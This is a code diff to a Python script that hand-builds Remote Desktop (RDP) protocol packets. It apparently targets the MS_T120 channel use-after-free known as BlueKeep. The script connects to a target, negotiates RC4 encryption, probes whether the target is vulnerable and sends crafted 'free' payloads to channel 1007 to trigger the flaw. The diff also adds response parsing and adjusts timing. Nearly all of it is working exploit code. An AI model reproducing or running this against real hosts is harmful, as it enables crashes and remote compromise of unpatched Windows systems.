@@ -23,7 +23,7 @@ def connect_req(name):
 def mcs_connect_init_pdu():
 
     packet = (
-'030001be02f0807f658201b20401010401010101ff30200202002202020002020200000202000102020000020200010202ffff020200023020020200010202000102020001020200010202000002020001020204200202000230200202ffff0202fc170202ffff0202000102020000020200010202ffff020200020482013f000500147c00018136000800100001c00044756361812801c0d800040008002003580201ca03aa09040000280a00006b0061006c00690000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c0380004000000636c697072647200c0a00000726470736e640000c00000004d535f5431323000808000004d535f543132300080800000'
+'030001be02f0807f658201b20401010401010101ff30200202002202020002020200000202000102020000020200010202ffff020200023020020200010202000102020001020200010202000002020001020204200202000230200202ffff0202fc170202ffff0202000102020000020200010202ffff020200020482013f000500147c00018136000800100001c00044756361812801c0d800040008002003580201ca03aa09040000280a00006b0061006c00690000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c03800040000007264706472000000000000c0726470736e640000000000c04d535f5431323000808000004d535f543132300080800000'
     )
 
     return binascii.unhexlify(packet)
@@ -162,7 +162,7 @@ def client_confirm(crypter):
 
     sec_hdr = binascii.unhexlify('08000000')
 
-    packet = binascii.unhexlify('a4011300ee03ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00ffff01000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000')
+    packet = binascii.unhexlify('a4011300ee03ea030100ea0306008e014d53545343000e00000001001800010003000002000000000c04000000000000000002001c00ffff01000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000')
 
     packet_sig = crypter.sign(packet)
     packet_enc = crypter.encrypt(packet)
@@ -254,7 +254,7 @@ def send_dc():
 # channelid is two byte channel id
 # virt_chan_data is data to send
 
-def write_mst120_custom(crypter, initiator, channelId, virt_chan_data):
+def write_virtual_channel(crypter, initiator, channelId, virt_chan_data):
 
     tpkt = binascii.unhexlify('0300') # still require two bytes for size
 
@@ -267,7 +267,7 @@ def write_mst120_custom(crypter, initiator, channelId, virt_chan_data):
 
     sec_hdr = binascii.unhexlify('08000000')
 
-   # channel_pdu_flags = binascii.unhexlify('03000000') # original
+#    channel_pdu_flags = binascii.unhexlify('03000000') # original
     channel_pdu_flags = binascii.unhexlify('42424242')
 
     # the len is not correct
@@ -302,39 +302,133 @@ def test_if_vuln_32(crypter):
     
     to_send = binascii.unhexlify('00000000020000000000000000000000')
 
-    return write_mst120_custom(crypter, 7, 1007, to_send)
+    return write_virtual_channel(crypter, 7, 1007, to_send)
 
 
 def test_if_vuln_64(crypter):
 
     to_send = binascii.unhexlify('0000000000000000020000000000000000000000000000000000000000000000')
 
-    return write_mst120_custom(crypter, 7, 1007, to_send)
+    return write_virtual_channel(crypter, 7, 1007, to_send)
 
 
-def free_packet(crypter):
+def free_32(crypter):
 
-    packet_hdr = binascii.unhexlify('0300003502f08064000703ef708026')
-    sec_hdr = binascii.unhexlify('08000000')
+#    packet_hdr = binascii.unhexlify('0300003502f08064000703ef708026')
+#    sec_hdr = binascii.unhexlify('08000000')
 
-    packet = binascii.unhexlify('1200000003000000000000000200000000000000000000005A5A')
+#    packet = binascii.unhexlify('1200000003000000000000000200000000000000000000005A5A')
 
-    packet_sig = crypter.sign(packet)
-    packet_enc = crypter.encrypt(packet)
+#    packet_sig = crypter.sign(packet)
+#    packet_enc = crypter.encrypt(packet)
     
-    return packet_hdr + sec_hdr + packet_sig + packet_enc
+#    return packet_hdr + sec_hdr + packet_sig + packet_enc
+
+    to_send = binascii.unhexlify('000000000200000000000000000000005A5A')
+
+    return write_virtual_channel(crypter, 7, 1007, to_send)
 
 
 def free_64(crypter):
 
     to_send = binascii.unhexlify('00000000000000000200000000000000000000000000000000000000000000005A5A')
 
-    return write_mst120_custom(crypter, 7, 1007, to_send)
+    return write_virtual_channel(crypter, 7, 1007, to_send)
 
 
 def get_ran_name():
     name = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
     return name.encode('utf-8')
+
+
+# commence janky parsing
+# might be useful 
+
+def get_tpkt_size(tpkt):
+    
+    return int.from_bytes(tpkt[2:4], byteorder='big')
+
+def read_rdp_data(s, crypter):
+
+    resp = b''
+
+    while True:
+
+        resp = resp + s.recv(8192)
+
+        len_msg = len(resp)
+
+        tpkt_offset = resp.find(b'\x03\x00') 
+
+        size = get_tpkt_size(resp[tpkt_offset:tpkt_offset+4])
+
+        if size <= len_msg:
+            parse_data(crypter, resp[tpkt_offset:tpkt_offset+size]) 
+
+            resp = resp[tpkt_offset+size:]
+
+
+def get_data(crypter, data):
+
+    data_len = len(data)
+    print('len of data = %d' % data_len)
+
+    tpkt = data[0:4]
+
+    if tpkt[0] != 3:
+        print('Error not tpkt')
+        return
+    
+    size = int.from_bytes(tpkt[2:4], byteorder='big')
+    print('size = %d' % size)
+    
+    parse_data(crypter, data[:size])
+
+    parsed = size 
+    
+    while parsed < data_len:
+
+        tpkt = data[parsed:parsed+4]
+
+        if tpkt[0] != 3:
+            print('Error not tpkt')
+            return
+
+        size = int.from_bytes(tpkt[2:4], byteorder='big')
+
+        parse_data(crypter, data[parsed:parsed+size])
+
+        parsed = parsed + size
+   
+        
+
+def parse_data(crypter, data):
+    
+    tpkt = data[0:4]
+    
+    ctop = data[4:7]
+
+    # PDU
+    pdu_type = data[7:8]
+    initiator = data[8:10]
+    channel_id = data[10:12]
+    print('data from %d to channel id = %d' % (int.from_bytes(initiator, byteorder='big'), int.from_bytes(channel_id, byteorder='big')))
+
+
+    sec_hdr_offset = data.find(b'\x08\x00\x00\x00')
+
+    sec_hdr = data[sec_hdr_offset:sec_hdr_offset+4]
+
+    print('sec_hdr: %s' % binascii.hexlify(sec_hdr))
+    sig = data[sec_hdr_offset+4:sec_hdr_offset+12]
+
+    print('sig: %s' % binascii.hexlify(sig))
+
+    enc_data = data[sec_hdr_offset+12:]
+
+    print('enc_data: %s' % binascii.hexlify(enc_data))
+
+    print('decrypted data: %s' % binascii.hexlify(crypter.decrypt(enc_data)))
 
 
 def connect(s):
@@ -352,7 +446,7 @@ def connect(s):
     # basic settings exchange
     s.sendall(mcs_connect_init_pdu())
     p = s.recv(4096)
-    time.sleep(.15)
+    time.sleep(.25)
     server_ran, pub_key, bit_len = parse_mcs_conn_resp(p)
     client_ran = b'A'*32
 
@@ -360,7 +454,7 @@ def connect(s):
     print('[+] sending erect domain and attach user')
     s.sendall(erect_domain_req())
     s.sendall(attach_user_req())
-    time.sleep(.15)
+    time.sleep(.25)
     s.recv(4096)
 
     print('[+] sending channel join requests')
@@ -373,43 +467,64 @@ def connect(s):
     print('[+] sending security exchange')
     # security exchange
     s.sendall(sec_exchange(pub_key, bit_len))
-    time.sleep(.15)
+    time.sleep(.5)
         
     non_fips = rdp_crypto.non_fips(server_ran, client_ran)
     crypter = rdp_crypto.rc4_crypter(non_fips)
 
     # client info pdu
     s.sendall(client_info(crypter, name))
-    time.sleep(.15)
-    s.recv(8000)
+    s.recv(4096)
+    time.sleep(.5)
 
-    print('[+] finalizing connection sequence')
+    # encrypted data begins here 
+    resp = s.recv(8192)
+#    get_data(crypter, resp)
+
+
+   # print('[+] finalizing connection sequence')
+
+    print('[+] sending client confirm')
     # send client confirm active pdu
     s.sendall(client_confirm(crypter))
     time.sleep(.15)
 
+    resp = s.recv(8192)
+#    get_data(crypter, resp)
+
     # send client sync
+
+    print('[+] sending client sync')
     s.sendall(client_sync(crypter))
     time.sleep(.15)
 
     # send client cooperate
+
+    print('[+] sending client cooperate')
     s.sendall(client_cooperate(crypter))
     time.sleep(.15)
-    #
-    ## send client control request
+   
+    # send client control request
+    print('[+] sending client control req')
     s.sendall(client_control_req(crypter))
-
     time.sleep(.15)
+
+    resp = s.recv(8192)
+#    get_data(crypter, resp)
 
     # send client persistent key length
+    print('[+] sending persistent key len')
     s.sendall(client_persistent_key_len(crypter))
     time.sleep(.15)
-
+    
     # send client font list
+    print('[+] sending client font list')
     s.sendall(client_font_list(crypter))
-    time.sleep(.15)
-    s.recv(8000)
+
+
     print('[+] connection established')
+
+#    read_rdp_data(s, crypter)
 
     return crypter
 
